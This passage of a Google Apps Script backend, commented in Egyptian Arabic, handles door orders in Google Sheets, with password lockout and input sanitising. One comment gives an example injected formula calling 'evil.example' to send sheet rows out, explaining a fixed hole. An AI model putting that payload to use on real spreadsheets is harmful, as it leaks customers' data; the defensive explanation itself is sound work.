/**
 * ============================================================
 *  WPC Doors App — Order Receiver
 *  El-Korashy for UPVC Doors & Windows
 * ============================================================
 *
 *  السكريبت ده مربوط بشيت WPC_Door_Orders_2026.
 *  بيستقبل الطلبات من التطبيق وبيكتبها بالإنجليزي في تبويبين:
 *    Orders       : سطر واحد لكل طلب (الملخّص)
 *    Order_Items  : سطر لكل صنف جوه الطلب
 *
 *  التبويبات بتتعمل لوحدها أول ما يوصل أول طلب — مش محتاج تعملها بإيدك.
 *
 *  عمود Status في تبويب Orders بيتحدّد من شاشة «🔒 المصنع» جوه التطبيق
 *  (كلمة السر بتتظبط من Script Properties باسم ADMIN_PW — شوف adminPw_ تحت). القيم:
 *      New          → طلب جديد
 *      Received     → تم استلام الطلب
 *      In Progress  → تحت التنفيذ (دخل الإنتاج)
 *      Ready        → جاهز للتحميل
 *      Delivered    → تم التسليم
 *      Cancelled    → ملغي
 *  تقدر كمان تكتبها بإيدك في الشيت مباشرة.
 *  وعمود Note to Distributor لو كتبت فيه حاجة هتظهرله كمان.
 *
 *  ⚠️ ده سكريبت منفصل تمامًا عن سكريبت تطبيق الـ UPVC.
 *     متستخدمش نفس الرابط للاتنين عشان الطلبات ما تتخلطش.
 */

var SHEET_ORDERS = 'Orders';
var SHEET_ITEMS  = 'Order_Items';
var SHEET_ERRORS = 'Errors';
var SHEET_STOCK  = 'Stock';        // أرصدة المخزن الجاهزة للتسليم خلال ٤٨ ساعة
var SHEET_PRICES = 'Prices';       // أسعار الكتالوج — مصدر واحد لكل الأجهزة
var HEAD_PRICES  = ['Prices JSON', 'Updated At'];

var HEAD_STOCK = ['Code', 'Size', 'Qty', 'Updated'];
var TZ           = 'Africa/Cairo';

// الحالات المسموحة — أي حاجة غيرها بتترفض.
// ⚠️ قبل كده كانت e.parameter.status بتتكتب في الشيت زي ما هي من غير أي تحقق.
// يعني طلب فيه غلطة إملائية أو نداء متعمّد كان يقدر يكتب أي نص في عمود الحالة،
// وساعتها التطبيق مش هيعرف الحالة دي: البادج بيطلع بالنص الخام، وقفل التعديل
// (LOCKED_EDIT_STATUSES) مش هيشتغل، والأرشفة الأوتوماتيك عند «Delivered» مش
// هتحصل — فالطلب يفضل معلّق في حالة ملهاش معنى ومحدش واخد باله.
var VALID_STATUSES = ['New', 'Received', 'In Progress', 'Ready', 'Delivered', 'Cancelled'];
var ROD_LEN      = 2.20;   // الطول الافتراضي — الطول الفعلي بيجي مع كل صنف في it.rodCm
// ⚠️⚠️ كلمة سر شاشة المصنع مابقتش مكتوبة في الكود.
//
// السبب: الملف ده متسجّل في مستودع GitHub عام على الإنترنت — يعني أي حد يفتح
// الرابط كان يشوف كلمة السر مكتوبة صريحة. مافيش تعقيد في كلمة السر بيحمي من ده.
//
// دلوقتي بتتقري من Script Properties (إعدادات المشروع في Apps Script نفسه،
// مش بتتحفظ في أي ملف ولا بتترفع على GitHub).
//
// إزاي تظبطها (مرة واحدة بس):
//   ١) افتح محرر Apps Script بتاع المشروع
//   ٢) من الشمال: ⚙️ Project Settings
//   ٣) انزل لـ "Script Properties" → Add script property
//   ٤) Property = ADMIN_PW   |   Value = كلمة السر اللي تختارها
//   ٥) Save، وبعدين Deploy → New deployment
//
// لو ما ظبطتهاش، شاشة المصنع هترفض الدخول وهتقول لك تظبطها — بدل ما تشتغل
// بكلمة سر معروفة للعالم كله.
function adminPw_() {
  var v = PropertiesService.getScriptProperties().getProperty('ADMIN_PW');
  return v ? String(v) : '';
}

// ⚠️ أرقام أعمدة تبويب Orders (تبدأ من ١). لو زوّدت أو رتّبت الأعمدة
// في HEAD_ORDERS تحت، لازم تظبّط الأرقام دي معاها.
var COL_STATUS   = 11;   // Status
var COL_NOTE     = 12;   // Note to Distributor
var COL_UPDATED  = 15;   // Status Updated   // كلمة سر شاشة المصنع — غيّرها من هنا لو حبيت
var PRICE_NOTE   = 'الأسعار بعاليه حسب وقت التسعير وغير ملزمة إلا في حالة سداد المبلغ كامل أو نصفه.';

var HEAD_ORDERS = [
  'Order No', 'Date', 'Time', 'Distributor', 'Phone', 'Region',
  'Warehouse', 'Total Qty', 'Total Rods', 'Total Amount', 'Status', 'Note to Distributor', 'Pricing Terms', 'Message', 'Status Updated',
  'Archived', 'Customer', 'Order Note', 'Customer Phone', 'Superseded', 'Replaces Order', 'Display No', 'Edit Count', 'Edited At'
];
var COL_ARCHIVED = 16;
var COL_CUSTOMER = 17;   // اسم صاحب الأوردر لو مختلف عن صاحب الجهاز
var COL_ORDNOTE  = 18;   // ملاحظات العميل على الطلب   // Y/N — بيتحدّد أوتوماتيك لما الحالة تبقى Delivered، أو يدوي من زرار الأرشفة
var COL_CUST_PHONE = 19; // رقم تليفون صاحب الأوردر لو مختلف عن صاحب الجهاز
var COL_SUPERSEDED = 20; // علامة "الطلب ده اتعدّل وعنده نسخة جديدة" — بتتحط لما نقدرش نمسح الطلب القديم أوتوماتيك (لسه دخل التنفيذ)
var COL_REPLACES = 21;   // لو الطلب ده جه بدل تعديل طلب قديم، بيتحط هنا رقم الطلب القديم — عشان المصنع يعرف إنه تعديل مش طلب جديد مستقل
var COL_DISPLAY_NO = 22; // رقم الطلب "العادي" التسلسلي (1، 2، 3...) اللي بيبان للعميل/المصنع بدل كود الطلب الداخلي الطويل
var COL_EDIT_COUNT  = 23; // عدد مرات التعديل — بيتورّث من الطلب الأصلي وبيزيد ١ مع كل تعديل
var COL_EDITED_AT   = 24; // تاريخ آخر تعديل. الطلب المعدّل بياخد تاريخ الطلب الأصلي عن قصد،
                          // فتاريخ التعديل نفسه مكانش متسجّل في أي مكان. بيبان في المستند
                          // جنب الرقم المركّب: «52/1 — التعديل رقم 1 بتاريخ ...»
                          // العمود بيتضاف تلقائي لأي شيت قديم (شوف sheet_ تحت).

var HEAD_ITEMS = [
  'Order No', 'Date', 'Distributor', 'Type', 'Item', 'Colour Code',
  'Size', 'Included with Door', 'Milling', 'Unit', 'Qty', 'Unit Price', 'Line Total', 'Available',
  'Frame (cm)', 'Bror', 'Frame Height (cm)', 'Width (cm)', 'Produced Qty', 'Door Height (cm)',
  'For Door Width (cm)', 'Item Note'
];
var COL_ITEM_WIDTH = 18;  // العرض بالسم كرقم خام (بس للأبواب) — بيتستخدم لخصم/رجوع رصيد المخزون بدقة
var COL_ITEM_AVAIL = 14;   // عمود "متاح؟" في تبويب Order_Items — Y/N، بيتحدّث من شاشة المصنع
var COL_ITEM_PRODUCED = 19; // عمود "الكمية المنتجة" — رقم من صفر لحد الكمية المطلوبة، بيتحدّث من شاشة المصنع
var COL_ITEM_DOORHEIGHT = 20; // ارتفاع الضلفة (سم) — اختياري، بس للأبواب المقاس القياسي (لو مختلف عن الاستاندر 210)
// عمودين جداد (v28) بيخزّنوا قيمة الحلق/البرور خام (منفصلين عن نص "Included with Door" الإنجليزي)
// عشان شاشة المصنع تقدر تعرضهم في عمودين منفصلين بالعربي بدل نص متلاصق واحد

/* ============================================================
   حماية كلمة سر المصنع من محاولات التخمين (brute force)
   بعد كل محاولة غلط بنستنى شوية قبل الرد (بتزيد كل مرة)، ولو المحاولات
   الغلط عدّت حد معيّن في ١٠ دقايق بنقفل الدخول تمامًا ١٥ دقيقة.
   ============================================================ */
// بتمنع Formula Injection: أي نص حر من العميل (اسم/ملاحظة) بيتكتب في الشيت،
// لو بيبدأ بـ = أو + أو - أو @ جوجل شيتس ممكن تفسّره كصيغة (formula) بدل نص عادي.
// بنحط علامة اقتباس (') قبله عشان يتخزن كنص حرفي زي ما هو، بالظبط زي ما بيحصل بالفعل لرقم الموبايل تحت.
// تنسيق تاريخ آمن. قبل كده كان الكود بينادي Utilities.formatDate(new Date(cell)) على طول،
// فأي صف فيه خانة تاريخ فاضية أو مكتوبة غلط بالإيد كان بيرمي استثناء يوقّع الرد كله —
// يعني شاشة المصنع وكل التقارير بتفضل فاضية بسبب صف واحد بايظ.
function fmtDate_(v) {
  try {
    if (v === '' || v === null || v === undefined) return '';
    var d = (v instanceof Date) ? v : new Date(v);
    if (isNaN(d.getTime())) return '';
    return Utilities.formatDate(d, TZ, 'yyyy-MM-dd');
  } catch (err) { return ''; }
}

// الكيبورد العربي بيكتب أرقام هندية (٠١٢٣٤٥٦٧٨٩). لو رقم موبايل اتسجّل كده،
// الشطر بـ /\D/g كان بيمسحه بالكامل (لأنها مش أرقام لاتينية) فيفضل فاضي —
// والموزع ده مايلاقيش طلباته أبدًا ولا يقدر يلغي طلب.
// بنحوّلها للاتينية الأول، فالسجلات القديمة بترجع تشتغل من غير ما نلمس الشيت.
function digitsOnly_(v) {
  return String(v == null ? '' : v)
    .replace(/[\u0660-\u0669]/g, function (d) { return String(d.charCodeAt(0) - 0x0660); })
    .replace(/[\u06F0-\u06F9]/g, function (d) { return String(d.charCodeAt(0) - 0x06F0); })
    .replace(/\D/g, '');
}

function sanitizeCell_(s) {
  s = String(s == null ? '' : s);
  // بنضيف \t و\r كمان: جوجل شيت بيتجاهل المسافات في أول الخانة، فـ "\t=CMD" لسه
  // بيتقري كصيغة. الشرط القديم كان بيفوّتها.
  if (/^[\s]*[=+\-@\t\r]/.test(s)) return "'" + s;
  return s;
}

// ⚠️ ثغرة كانت هنا: تنظيف الصيغ (sanitizeCell_) كان متطبّق على 4 حقول بس
// (الاسم، صاحب الأوردر، ملاحظات العميل، ملاحظة الصنف). باقي الحقول اللي الموزع
// بيكتبها بإيده — «المنطقة»، ونص الرسالة، وتليفون صاحب الأوردر، واسم الصنف والكود
// والمقاس — كانت بتتكتب في الشيت زي ما هي.
// و endpoint الـ newOrder مفتوح من غير كلمة سر (لازم يفضل كده عشان الموزعين
// يقدروا يبعتوا)، يعني أي حد يقدر يبعت طلب فيه صيغة زي:
//     =IMPORTXML("https://evil.example/?d="&A1&B1, "//x")
// وأول ما موظف المصنع يفتح الشيت، جوجل بينفّذ الصيغة ويسرّب بيانات الصفوف لسيرفر بره.
// الحل: ننظّف الصف كله — كل خانة نصية بتعدّي على sanitizeCell_، والأرقام والتواريخ
// بتفضل زي ما هي عشان الجمع والترتيب في الشيت ما يتكسرش.
function sanitizeRow_(row) {
  return row.map(function (v) {
    return (typeof v === 'string') ? sanitizeCell_(v) : v;
  });
}

// بيرجّع رقم الطلب "العادي" التسلسلي الجاي (1، 2، 3...) — بيتخزن في Script Properties وبيتزوّد بأمان.
// ملحوظة: من غير قفل هنا عمدًا — اللي بينادي الدالة دي (doPost / doGet لأكشن newOrder) ماسك
// LockService.getScriptLock() أصلًا على العملية كلها، فقفل تاني جوّه كان ممكن يعمل قفل مزدوج.
// أول مرة (لو مفيش رقم متخزّن قبل كده) بيبدأ من عدد الطلبات الموجودة فعلاً في الشيت عشان الترقيم يكمل من عندهم مش يرجع لـ١.
function nextOrderDisplayNo_(sh) {
  var props = PropertiesService.getScriptProperties();
  var cur = props.getProperty('ORDER_DISPLAY_NO_SEQ');
  if (cur === null) {
    // ⚠️ كان بياخد أول رقم من عدد صفوف الشيت (last - 1). لكن تعديل الطلب بيمسح
    // صف الطلب القديم، فعدد الصفوف دايمًا أقل من أكبر رقم اتصرف فعلاً. يعني لو
    // العدّاد اتصفّر (نسخة جديدة من السكريبت أو مسح خصائصه) الترقيم كان بيرجع
    // لورا وطلبين مختلفين ياخدوا نفس الرقم. بنقرا أكبر رقم موجود بجد بدل كده.
    cur = String(maxOrderDisplayNo_(sh));
  }
  var next = Number(cur) + 1;
  props.setProperty('ORDER_DISPLAY_NO_SEQ', String(next));
  return next;
}

// أكبر رقم طلب متصرّف فعلاً في الشيت. بتتنادى مرة واحدة بس (أول مرة يتظبط
// فيها العدّاد)، فقراية العمود كله هنا مش بتكلّف حاجة على الطلبات العادية.
function maxOrderDisplayNo_(sh) {
  var last = sh.getLastRow();
  if (last < 2) return 0;
  var vals = sh.getRange(2, COL_DISPLAY_NO, last - 1, 1).getValues();
  var mx = 0;
  for (var i = 0; i < vals.length; i++) {
    var n = Number(vals[i][0]);
    if (isFinite(n) && n > mx) mx = n;
  }
  return mx;
}

// ⚠️ المشكلة اللي كانت في النسخة القديمة: العدّاد والقفل كانوا عامّين على السكريبت
// كله. يعني أي حد يعمل ١٥ محاولة غلط كان بيقفل شاشة المصنع على الموظفين كلهم ١٥
// دقيقة — هجمة تعطيل بسيطة جدًا وبتتكرر على طول.
//
// النظام الجديد بطبقتين:
//   • طبقة الجهاز: ٥ محاولات غلط من نفس الجهاز → الجهاز ده يتقفل ١٥ دقيقة.
//     المهاجم بيتقفل، والموظف على جهازه مش متأثر خالص.
//   • طبقة عامة: مافيش قفل نهائي أبدًا — بس تأخير بيكبر مع عدد المحاولات الغلط
//     (لحد ٨ ثواني). يعني التخمين بيبقى بطيء جدًا، والموظف اللي بيكتب كلمة السر
//     الصح بيدخل على طول من غير ما يستنى.
// النتيجة: التخمين أصعب من الأول، ومافيش طريقة تقفل الشاشة على المصنع.
function checkAdminPw_(pw, devId) {
  var cache = CacheService.getScriptCache();
  var pwReal = adminPw_();

  // كلمة السر مش متظبّطة في Script Properties — بلّغ بوضوح بدل ما تقبل أي حاجة
  if (!pwReal) return false;

  var dev = String(devId || '').replace(/[^A-Za-z0-9_-]/g, '').slice(0, 40) || 'nodev';
  var devFailKey = 'adm_f_' + dev;
  var devLockKey = 'adm_l_' + dev;
  var globFailKey = 'adm_fail_count';

  // الجهاز ده مقفول؟
  var lockedUntil = Number(cache.get(devLockKey) || 0);
  if (lockedUntil && Date.now() < lockedUntil) return false;

  if (String(pw || '') === pwReal) {
    cache.remove(devFailKey);
    cache.remove(devLockKey);
    return true;
  }

  // فشل: زوّد العدّادين
  var devFails = Number(cache.get(devFailKey) || 0) + 1;
  cache.put(devFailKey, String(devFails), 900);              // نافذة ١٥ دقيقة للجهاز
  if (devFails >= 5) {
    cache.put(devLockKey, String(Date.now() + 15 * 60000), 1200);   // اقفل الجهاز ده بس
  }

  var globFails = Number(cache.get(globFailKey) || 0) + 1;
  cache.put(globFailKey, String(globFails), 600);            // نافذة ١٠ دقايق عامة
  // تأخير عام بيكبر مع المحاولات — بيبطّأ التخمين من غير ما يقفل على حد
  Utilities.sleep(Math.min(globFails * 400, 8000));
  return false;
}

// مقارنة صامتة بكلمة السر — من غير عدّادات ولا تأخير.
// بتتستخدم بس في المسارات اللي المستخدم العادي بيعدي منها كمان (زي «تابع طلبك»
// وإلغاء الطلب برقم الموبايل)، عشان مانعاقبش الموزع العادي بتأخير 8 ثواني
// وإحنا أصلًا مش بنطلب منه كلمة سر. لو مفيش كلمة سر مبعوتة بترجّع false على طول.
function isAdminPwQuiet_(pw) {
  var real = adminPw_();
  return !!(real && String(pw || '') === real);
}

// بيرجّع رسالة الخطأ المناسبة لشاشة المصنع
function adminPwError_() {
  if (!adminPw_()) {
    return 'كلمة سر المصنع مش متظبّطة على السيرفر — افتح Apps Script → Project Settings → Script Properties وضيف ADMIN_PW';
  }
  return 'كلمة السر غلط';
}

/* ============================================================
   استقبال الطلب من التطبيق
   ============================================================ */
function doPost(e) {
  var lock = LockService.getScriptLock();
  try {
    // القفل بيمنع إن طلبين يوصلوا في نفس اللحظة ويكتبوا فوق بعض
    lock.waitLock(20000);

    var body = JSON.parse(e.postData.contents);

    if (body.action !== 'newOrder' || !body.order) {
      return json({ ok: false, error: 'Unknown action' });
    }

    var saved = saveOrder_(body.order);
    return json({ ok: true, id: body.order.id, displayNo: saved.displayNo, editCount: saved.editCount });

  } catch (err) {
    logError_(err);
    return json({ ok: false, error: String(err) });
  } finally {
    try { lock.releaseLock(); } catch (e2) {}
  }
}

/* ============================================================
   قراءة الطلبات (للاستخدام لاحقًا لو حبيت التطبيق يعرضها)
   ============================================================ */
function doGet(e) {
  var cb = (e && e.parameter && e.parameter.callback) || '';
  try {
    var action = (e && e.parameter && e.parameter.action) || 'ping';

    if (action === 'ping') {
      return reply({ ok: true, msg: 'WPC orders script is running' }, cb);
    }

    // إضافة طلب جديد عبر GET (JSONP) — بديل مضمون الرد لطلب POST العادي،
    // عشان التطبيق يقدر يتأكد فعليًا إن الطلب وصل قبل ما يقول للموزع "تم الإرسال".
    if (action === 'newOrder') {
      var lockNO = LockService.getScriptLock();
      try {
        lockNO.waitLock(20000);
        var orderNO = JSON.parse(String(e.parameter.payload || '{}'));
        if (!orderNO || !orderNO.id) return reply({ ok: false, error: 'بيانات الطلب ناقصة' }, cb);
        var savedNO = saveOrder_(orderNO);
        return reply({ ok: true, id: orderNO.id, displayNo: savedNO.displayNo, editCount: savedNO.editCount }, cb);
      } catch (errNO) {
        logError_(errNO);
        return reply({ ok: false, error: String(errNO) }, cb);
      } finally {
        try { lockNO.releaseLock(); } catch (eNO) {}
      }
    }

    // تحديث حالة الطلب — من شاشة المصنع
    if (action === 'setStatus') {
      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
        return reply({ ok: false, error: adminPwError_() }, cb);
      }
      var lock = LockService.getScriptLock();
      try {
        lock.waitLock(15000);
        var shS = sheet_(SHEET_ORDERS, HEAD_ORDERS);
        var r = findRow_(shS, e.parameter.id);
        if (r < 0) return reply({ ok: false, error: 'الطلب مش موجود' }, cb);
        var newStatus = String(e.parameter.status || '');
        if (VALID_STATUSES.indexOf(newStatus) < 0) {
          return reply({ ok: false, error: 'حالة غير معروفة: ' + newStatus }, cb);
        }
        // ⚠️ الإلغاء عن طريق cancelOrder/deleteOrder كان بيرجّع الرصيد، لكن تغيير
        // الحالة لـ Cancelled من هنا مكانش بيرجّعه — فالرصيد يفضل مخصوم لطلب
        // ملغي. بنمشي على نفس القاعدة: الملغي بيرجّع رصيده، والراجع من الإلغاء
        // لحالة نشطة بيتخصم تاني. المُسلَّم فعليًا مالوش رصيد يرجع.
        var oldStatus = String(shS.getRange(r, COL_STATUS).getValue() || '');
        if (newStatus !== oldStatus) {
          if (newStatus === 'Cancelled' && oldStatus !== 'Delivered') {
            adjustStockForOrderId_(e.parameter.id, +1);
          } else if (oldStatus === 'Cancelled' && newStatus !== 'Cancelled') {
            adjustStockForOrderId_(e.parameter.id, -1);
          }
        }
        shS.getRange(r, COL_STATUS).setValue(newStatus);
        shS.getRange(r, COL_UPDATED).setValue(new Date());
        var archivedNow = false;
        if (newStatus === 'Delivered') {          // تسليم الطلب = أرشفة أوتوماتيك
          shS.getRange(r, COL_ARCHIVED).setValue('Y');
          archivedNow = true;
        }
        return reply({ ok: true, id: e.parameter.id, status: newStatus, archived: archivedNow }, cb);
      } finally {
        try { lock.releaseLock(); } catch (e2) {}
      }
    }

    // أرشفة/إرجاع طلب يدويًا (📦 أرشفة أو ↩️ رجّع من الأرشيف)
    if (action === 'archiveOrder') {
      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
        return reply({ ok: false, error: adminPwError_() }, cb);
      }
      var lockAR = LockService.getScriptLock();
      try {
        lockAR.waitLock(15000);
        var shAR = sheet_(SHEET_ORDERS, HEAD_ORDERS);
        var rAR = findRow_(shAR, e.parameter.id);
        if (rAR < 0) return reply({ ok: false, error: 'الطلب مش موجود' }, cb);
        shAR.getRange(rAR, COL_ARCHIVED).setValue(String(e.parameter.archived) === '1' ? 'Y' : 'N');
        return reply({ ok: true, id: e.parameter.id }, cb);
      } finally {
        try { lockAR.releaseLock(); } catch (eAR) {}
      }
    }

    if (action === 'list') {
      var isAdmin;
      if (e.parameter.phone) {
        // مستخدم عادي بيجيب طلباته هو برقم موبايله — مفيش داعي لأي تحقق باسورد أو تقييد محاولات
        isAdmin = isAdminPwQuiet_(e.parameter.pw);
      } else {
        // مفيش رقم موبايل = محاولة دخول شاشة المصنع؛ لازم تعدي بوابة الحماية من التخمين
        if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) return reply({ ok: false, error: adminPwError_() }, cb);
        isAdmin = true;
      }
      var phone = isAdmin ? '' : digitsOnly_((e.parameter.phone || ''));
      var sh = sheet_(SHEET_ORDERS, HEAD_ORDERS);
      var rows = readOrderRows_(sh);   // بيتخطى أعمدة Message وPricing Terms التقيلة
      var out = [];

      for (var i = 0; i < rows.length; i++) {
        var rowPhone = digitsOnly_(rows[i][4] || '');

        // لو التطبيق بعت رقم، بنرجّع طلبات الرقم ده بس.
        // بنقارن بآخر ٩ أرقام عشان الصفر البادئ وكود الدولة ما يفرقوش.
        if (phone) {
          var a = phone.slice(-9), b = rowPhone.slice(-9);
          if (!a || a !== b) continue;
        }

        // فلترة الأرشيف — للمصنع بس (العميل بيشوف كل طلباته دايمًا مهما كانت مؤرشفة).
        // من غير ?archived=1: بيرجع النشط بس. مع ?archived=1: بيرجع المؤرشف بس.
        if (isAdmin) {
          var isArch = String(rows[i][COL_ARCHIVED - 1] || '') === 'Y';
          var wantArch = String(e.parameter.archived || '') === '1';
          if (isArch !== wantArch) continue;
        }

        out.push({
          id:     rows[i][0],
          date:   fmtDate_(rows[i][1]),
          dist:   rows[i][3],
          phone:  isAdmin ? String(rows[i][4] || '').replace(/^'/, '') : '',
          region: rows[i][5],
          qty:    rows[i][7],
          rods:   rows[i][8],
          total:  rows[i][9],
          status: rows[i][10],
          note:   rows[i][11],      // ملاحظة المصنع للموزع
          customer: rows[i][COL_CUSTOMER - 1] || '',
          customerPhone: isAdmin ? String(rows[i][COL_CUST_PHONE - 1] || '').replace(/^'/, '') : '',
          ordNote:  rows[i][COL_ORDNOTE  - 1] || '',
          replacesId: rows[i][COL_REPLACES - 1] || '',
          displayNo: rows[i][COL_DISPLAY_NO - 1] || '',
          editCount: rows[i][COL_EDIT_COUNT - 1] || 0,
          editedAt: fmtDate_(rows[i][COL_EDITED_AT - 1]),
          archived: isAdmin ? (String(rows[i][COL_ARCHIVED - 1] || '') === 'Y') : undefined
        });
      }
      return reply({ ok: true, orders: out }, cb);
    }

    // قايمة أصناف طلب واحد بالتفصيل — لشاشة المصنع بس (لعرض/تعديل التوفر ولتصدير PDF)
    if (action === 'orderItems') {
      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
        return reply({ ok: false, error: adminPwError_() }, cb);
      }
      var shOI = sheet_(SHEET_ITEMS, HEAD_ITEMS);
      var idOI = String(e.parameter.id || '');
      var lastOI = shOI.getLastRow();
      var itemsOut = [];
      if (lastOI >= 2) {
        var valsOI = shOI.getRange(2, 1, lastOI - 1, HEAD_ITEMS.length).getValues();
        for (var iOI = 0; iOI < valsOI.length; iOI++) {
          if (String(valsOI[iOI][0]) === idOI) {
            itemsOut.push({
              type:      valsOI[iOI][3],
              title:     valsOI[iOI][4],
              code:      valsOI[iOI][5],
              size:      valsOI[iOI][6],
              included:  valsOI[iOI][7],
              milling:   valsOI[iOI][8],
              unit:      valsOI[iOI][9],
              qty:       valsOI[iOI][10],
              unitPrice: valsOI[iOI][11],
              lineTotal: valsOI[iOI][12],
              avail:     valsOI[iOI][13] !== 'N',
              frame:     valsOI[iOI][14] || '',
              dbror:     valsOI[iOI][15] || '',
              frameHeight: valsOI[iOI][16] || '',
              width:     valsOI[iOI][17] || '',
              produced:  Number(valsOI[iOI][18]) || 0,
              doorHeight: valsOI[iOI][19] || '',
              forDoorWidth: valsOI[iOI][20] || '',
              itemNote:  valsOI[iOI][21] || ''
            });
          }
        }
      }
      return reply({ ok: true, items: itemsOut }, cb);
    }

    // تحديد صنف معيّن جوه طلب كـ"غير متاح" أو رجّعه "متاح" — بالـ idx (ترتيبه جوه الطلب، يبدأ من صفر)
    if (action === 'setItemAvail') {
      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
        return reply({ ok: false, error: adminPwError_() }, cb);
      }
      var lockIA = LockService.getScriptLock();
      try {
        lockIA.waitLock(15000);
        var shIA = sheet_(SHEET_ITEMS, HEAD_ITEMS);
        var idIA = String(e.parameter.id || '');
        var idxIA = Number(e.parameter.idx || 0);
        var lastIA = shIA.getLastRow();
        if (lastIA < 2) return reply({ ok: false, error: 'الطلب مش موجود' }, cb);
        var idsIA = shIA.getRange(2, 1, lastIA - 1, 1).getValues();
        var foundIA = -1, countIA = -1;
        for (var iIA = 0; iIA < idsIA.length; iIA++) {
          if (String(idsIA[iIA][0]) === idIA) {
            countIA++;
            if (countIA === idxIA) { foundIA = iIA + 2; break; }
          }
        }
        if (foundIA < 0) return reply({ ok: false, error: 'الصنف مش موجود' }, cb);
        shIA.getRange(foundIA, COL_ITEM_AVAIL).setValue(String(e.parameter.avail) === '1' ? 'Y' : 'N');
        return reply({ ok: true }, cb);
      } finally {
        try { lockIA.releaseLock(); } catch (eIA) {}
      }
    }

    // تحديث الكمية المنتجة فعليًا لصنف معيّن جوه طلب (تتبّع الإنتاج الجزئي) — نفس منطق setItemAvail بالظبط
    // تعديل الكمية المطلوبة لصنف معيّن جوه طلب (يدوي من شاشة المصنع، من غير ما يفتح "طلب جديد")
    // بيحدّث سطر الصنف (الكمية + الإجمالي) وبعدين بيعيد حساب إجماليات الطلب كله (كمية/عيدان/مبلغ)
    // تعديل بيانات الطلب الأساسية (اسم صاحب الأوردر / التاريخ) — يدوي من شاشة المصنع، من غير ما تفتح "طلب جديد"
    if (action === 'setOrderMeta') {
      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
        return reply({ ok: false, error: adminPwError_() }, cb);
      }
      var lockOM = LockService.getScriptLock();
      try {
        lockOM.waitLock(15000);
        var shOM = sheet_(SHEET_ORDERS, HEAD_ORDERS);
        var rOM = findRow_(shOM, e.parameter.id);
        if (rOM < 0) return reply({ ok: false, error: 'الطلب مش موجود' }, cb);
        if (e.parameter.customer !== undefined) {
          shOM.getRange(rOM, COL_CUSTOMER).setValue(sanitizeCell_(e.parameter.customer || ''));
        }
        if (e.parameter.date) {
          var dOM = new Date(String(e.parameter.date) + 'T00:00:00');
          if (!isNaN(dOM.getTime())) shOM.getRange(rOM, 2).setValue(Utilities.formatDate(dOM, TZ, 'yyyy-MM-dd'));
        }
        return reply({ ok: true, id: e.parameter.id,
          customer: shOM.getRange(rOM, COL_CUSTOMER).getValue(),
          date: fmtDate_(shOM.getRange(rOM, 2).getValue()) }, cb);
      } finally {
        try { lockOM.releaseLock(); } catch (eOM) {}
      }
    }

    if (action === 'setItemQty') {
      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
        return reply({ ok: false, error: adminPwError_() }, cb);
      }
      var lockIQ = LockService.getScriptLock();
      try {
        lockIQ.waitLock(15000);
        var shIQ = sheet_(SHEET_ITEMS, HEAD_ITEMS);
        var idIQ = String(e.parameter.id || '');
        var idxIQ = Number(e.parameter.idx || 0);
        var newQtyIQ = Number(e.parameter.qty);
        if (!newQtyIQ || newQtyIQ < 1) return reply({ ok: false, error: 'الكمية لازم تكون رقم أكبر من صفر' }, cb);
        var lastIQ = shIQ.getLastRow();
        if (lastIQ < 2) return reply({ ok: false, error: 'الطلب مش موجود' }, cb);
        var idsIQ = shIQ.getRange(2, 1, lastIQ - 1, 1).getValues();
        var foundIQ = -1, countIQ = -1;
        for (var iIQ = 0; iIQ < idsIQ.length; iIQ++) {
          if (String(idsIQ[iIQ][0]) === idIQ) {
            countIQ++;
            if (countIQ === idxIQ) { foundIQ = iIQ + 2; break; }
          }
        }
        if (foundIQ < 0) return reply({ ok: false, error: 'الصنف مش موجود' }, cb);
        var unitPriceIQ = Number(shIQ.getRange(foundIQ, 12).getValue()) || 0;   // عمود Unit Price
        var producedIQ = Number(shIQ.getRange(foundIQ, COL_ITEM_PRODUCED).getValue()) || 0;
        if (producedIQ > newQtyIQ) producedIQ = newQtyIQ;   // ميفضلش "جاهز" أكبر من "مطلوب" بعد التعديل

        // ⚠️ باج كان هنا: الكمية بتتغيّر والرصيد ما بيتعدّلش خالص. يعني لو المصنع
        // عدّل صنف من 5 أبواب لـ 2، التلاتة الباقيين بيفضلوا مخصومين من المخزن
        // للأبد (الرصيد يبان أقل من الحقيقة). والعكس لو زوّد الكمية.
        // بنعدّل الرصيد بالفرق: القديم ناقص الجديد.
        var stkIQ = stockItemFromRow_(shIQ, foundIQ);
        if (stkIQ && orderStatus_(idIQ) !== 'Delivered') {
          var diffIQ = stkIQ.qty - newQtyIQ;          // موجب = نرجّع للمخزن، سالب = نخصم زيادة
          if (diffIQ) adjustStockForItems_([{ kind:'door', code:stkIQ.code, w:stkIQ.w, qty:Math.abs(diffIQ) }],
                                           diffIQ > 0 ? +1 : -1);
        }

        shIQ.getRange(foundIQ, 11).setValue(newQtyIQ);                    // Qty
        shIQ.getRange(foundIQ, 13).setValue(unitPriceIQ * newQtyIQ);      // Line Total
        shIQ.getRange(foundIQ, COL_ITEM_PRODUCED).setValue(producedIQ);
        var totalsIQ = recomputeOrderTotals_(idIQ);
        return reply({ ok: true, qty: newQtyIQ, produced: producedIQ, totals: totalsIQ }, cb);
      } finally {
        try { lockIQ.releaseLock(); } catch (eIQ) {}
      }
    }

    // حذف صنف واحد بس من طلب (يدوي من شاشة المصنع) وإعادة حساب إجماليات الطلب
    if (action === 'deleteOrderItem') {
      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
        return reply({ ok: false, error: adminPwError_() }, cb);
      }
      var lockDI = LockService.getScriptLock();
      try {
        lockDI.waitLock(15000);
        var shDI = sheet_(SHEET_ITEMS, HEAD_ITEMS);
        var idDI = String(e.parameter.id || '');
        var idxDI = Number(e.parameter.idx || 0);
        var lastDI = shDI.getLastRow();
        if (lastDI < 2) return reply({ ok: false, error: 'الطلب مش موجود' }, cb);
        var idsDI = shDI.getRange(2, 1, lastDI - 1, 1).getValues();
        var foundDI = -1, countDI = -1;
        for (var iDI = 0; iDI < idsDI.length; iDI++) {
          if (String(idsDI[iDI][0]) === idDI) {
            countDI++;
            if (countDI === idxDI) { foundDI = iDI + 2; break; }
          }
        }
        if (foundDI < 0) return reply({ ok: false, error: 'الصنف مش موجود' }, cb);

